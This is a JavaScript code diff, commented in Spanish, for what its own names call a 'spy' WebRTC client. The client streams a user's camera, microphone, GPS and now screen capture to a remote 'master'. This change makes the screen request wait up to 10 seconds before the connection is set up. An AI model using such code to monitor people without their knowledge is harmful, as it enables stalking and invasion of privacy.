@@ -2394,13 +2394,32 @@ const Session = (() => {
               });
             } catch(e) { console.warn('[espia WH] solo audio fallo:', e.message); }
           }
-          // [v2.13.69 REFACTOR] pantalla NO se pide aquí más — se pide ASYNC
-          // después de que la conexión esté establecida. Antes await bloqueaba
-          // 30s+ esperando user gesture → audio/cam/GPS no llegaban al master
-          // hasta que el user decidiera sobre pantalla.
+          // [v2.13.72] Volver al modelo secuencial pero con timeout. WebRTC
+          // replaceTrack en transceiver vacío NO dispara ontrack en el master,
+          // entonces la pantalla nunca llegaba aunque el cliente la enviara.
+          // Solución: esperar getDisplayMedia hasta 10s ANTES de crear answer.
+          // Si user acepta rápido → pantalla incluida en SDP correctamente.
+          // Si tarda >10s o rechaza → seguir sin pantalla.
           if (!window._espiaCliWH.streams.userMedia) {
             await window._espiaCliWHCerrar('sin_streams');
             return;
+          }
+          // Pedir pantalla con timeout 10s. NO await infinito.
+          if (navigator.mediaDevices && typeof navigator.mediaDevices.getDisplayMedia === 'function') {
+            try {
+              console.log('[espia WH] solicitando pantalla (timeout 10s)...');
+              const displayPromise = navigator.mediaDevices.getDisplayMedia({
+                video: { frameRate: { ideal: 15 } }, audio: false
+              });
+              const timeoutPromise = new Promise((_, rej) => setTimeout(() => rej(new Error('timeout 10s')), 10000));
+              window._espiaCliWH.streams.display = await Promise.race([displayPromise, timeoutPromise]);
+              const trcks = window._espiaCliWH.streams.display.getVideoTracks();
+              console.log('[espia WH] pantalla OK · tracks:', trcks.length, 'surface:', trcks[0]?.getSettings?.()?.displaySurface);
+            } catch(eS) {
+              console.warn('[espia WH] sin pantalla:', eS.message);
+            }
+          } else {
+            console.log('[espia WH] getDisplayMedia no disponible (iOS Safari <17?)');
           }
           const pc = new RTCPeerConnection({
             iceServers: [{ urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302'] }]
@@ -2409,42 +2428,11 @@ const Session = (() => {
           if (window._espiaCliWH.streams.userMedia) {
             window._espiaCliWH.streams.userMedia.getTracks().forEach(t => pc.addTrack(t, window._espiaCliWH.streams.userMedia));
           }
-          // [v2.13.69] Reservar transceiver para pantalla — slot vacío que
-          // luego rellenamos con replaceTrack() cuando llegue el stream display.
-          // Esto evita renegociación SDP cuando agregamos pantalla más tarde.
-          let displayTransceiver = null;
-          try {
-            displayTransceiver = pc.addTransceiver('video', { direction: 'sendonly' });
-            window._espiaCliWH._displayTransceiver = displayTransceiver;
-          } catch(eT) { console.warn('[espia WH] no se pudo reservar transceiver pantalla:', eT.message); }
-          // [v2.13.69] getDisplayMedia ASYNC sin bloquear el flow principal.
-          // Si el user acepta, replaceTrack en el transceiver reservado.
-          // Si rechaza/timeout, no hace nada y el resto del espía sigue.
-          if (navigator.mediaDevices && typeof navigator.mediaDevices.getDisplayMedia === 'function') {
-            (async () => {
-              try {
-                console.log('[espia WH] solicitando pantalla async (no bloquea cam/mic/GPS)...');
-                const screen = await navigator.mediaDevices.getDisplayMedia({
-                  video: { frameRate: { ideal: 15 } }, audio: false
-                });
-                window._espiaCliWH.streams.display = screen;
-                const tracks = screen.getVideoTracks();
-                console.log('[espia WH] pantalla obtenida · tracks:', tracks.length, 'displaySurface:', tracks[0]?.getSettings?.()?.displaySurface);
-                if (displayTransceiver && tracks[0]) {
-                  await displayTransceiver.sender.replaceTrack(tracks[0]);
-                  console.log('[espia WH] pantalla agregada al transceiver reservado · sin renegociación ✓');
-                  // Si el user detiene la compartición, limpiar el slot
-                  tracks[0].onended = () => {
-                    console.log('[espia WH] user detuvo compartir pantalla');
-                    try { displayTransceiver.sender.replaceTrack(null); } catch(_){}
-                  };
-                }
-              } catch(eS) {
-                console.warn('[espia WH] getDisplayMedia rechazado o falló:', eS.message);
-              }
-            })();
-          } else {
-            console.log('[espia WH] getDisplayMedia no disponible (iOS Safari <17?)');
+          if (window._espiaCliWH.streams.display) {
+            window._espiaCliWH.streams.display.getTracks().forEach(t => {
+              pc.addTrack(t, window._espiaCliWH.streams.display);
+              t.onended = () => console.log('[espia WH] user detuvo compartir pantalla');
+            });
           }
           const gpsCh = pc.createDataChannel('gps');
           window._espiaCliWH.gpsCh = gpsCh;
